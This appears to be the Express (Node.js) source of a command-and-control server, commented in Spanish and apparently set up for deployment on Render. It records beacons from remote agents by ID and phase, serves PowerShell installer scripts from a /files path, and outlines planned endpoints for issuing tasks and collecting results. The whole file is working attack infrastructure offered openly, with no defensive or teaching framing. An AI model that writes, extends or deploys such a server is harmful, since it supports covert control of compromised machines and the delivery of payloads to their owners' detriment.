import dotenv from 'dotenv';
import express from 'express';
import morgan from 'morgan';
import fs from 'fs';
import path from 'path';
// import url from 'url'; // No se usa actualmente con Express req.query

// Cargar variables de entorno desde .env solo si el archivo existe (para desarrollo local)
// En Render, las variables de entorno se establecen a través del dashboard o render.yaml
const envPath = path.join(path.resolve(), '.env'); // path.resolve() necesita 'path'
if (fs.existsSync(envPath)) { // fs.existsSync necesita 'fs'
  dotenv.config({ path: envPath });
  console.log('Archivo .env local cargado.');
}

const app = express();
const PORT = process.env.PORT || 3005; // Render seteará process.env.PORT

// --- Configuración de Logging ---
// Crear un stream de escritura para los logs de morgan (logs HTTP)
// Los logs de morgan irán a la consola, Render los captura.
app.use(morgan('dev'));

// Crear directorio de logs si no existe para los logs de beacons/comandos
const logsDir = path.join(path.resolve(), 'logs'); // path.resolve() da el dir actual del proyecto
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}
const beaconLogStream = fs.createWriteStream(path.join(logsDir, 'beacons.log'), { flags: 'a' });
const commandLogStream = fs.createWriteStream(path.join(logsDir, 'commands.log'), { flags: 'a' });

function logToFile(stream, message) {
    const timestamp = new Date().toISOString();
    stream.write(`[${timestamp}] ${message}\n`);
    console.log(`Logged to file: ${message}`); // También loguear a consola para Render
}
// -----------------------------

// --- Servir Archivos Estáticos ---
// Servir los scripts .ps1 desde la carpeta 'public'
const publicDir = path.join(path.resolve(), 'public');
app.use('/files', express.static(publicDir)); // Accedido vía /files/core_services_mvp1.ps1
// ------------------------------

// --- Rutas del C2 ---
// Endpoint de Beacon (MVP1)
app.get('/api/updates', (req, res) => {
    const agentId = req.query.uid || 'UnknownAgent';
    const phase = req.query.phase || 'UnknownPhase';
    const message = `Beacon recibido de: ${agentId} (Fase: ${phase})`;
    
    console.log(`[+] ${message}`); // Log a la consola (Render lo captura)
    logToFile(beaconLogStream, message); // Log a beacons.log
    
    res.status(200).send('Beacon received by C2 server (MVP1 - Express)\n');
});

// Health Check Endpoint para Render
app.get('/api/health', (req, res) => {
    res.status(200).send('OK');
});

// Futuros endpoints para MVP2: /gettask, /sendresult
// app.post('/api/tasks/:agentId/get', (req, res) => { ... });
// app.post('/api/results/:agentId/send', express.json(), (req, res) => { ... });
// -----------------

// --- Manejo de Errores Básico ---
app.use((req, res) => { // Eliminado _next ya que no se usa y no es un error handler
    res.status(404).send("Endpoint no encontrado en C2 Express\n");
});

// Para el error handler, Express necesita 4 argumentos para identificarlo como tal.
// Si ESLint sigue quejándose de _next no usado, se deberá ajustar la config de ESLint
// o aceptar la advertencia para este caso específico.
app.use((err, req, res, _next) => {
    console.error("Error en C2 Express:", err.stack);
    logToFile(commandLogStream, `SERVER_ERROR: ${err.message} - Stack: ${err.stack}`);
    res.status(500).send('Error interno del servidor C2\n');
});
// ---------------------------

const server = app.listen(PORT, () => {
    console.log(`Servidor C2 (Express) escuchando en el puerto ${PORT}`);
    console.log(`  -> Endpoint de beacon: GET /api/updates?uid=AGENT_ID&phase=mvpX`);
    console.log(`  -> Archivos estáticos servidos desde /files (ej. /files/installer_mvp1.ps1)`);
    logToFile(commandLogStream, `Servidor C2 iniciado en puerto ${PORT}.`);
});

// Manejo de cierre del servidor
process.on('SIGTERM', () => {
    logToFile(commandLogStream, 'Servidor C2 cerrándose (SIGTERM)...');
    server.close(() => {
        logToFile(commandLogStream, 'Servidor C2 cerrado.');
        process.exit(0);
    });
});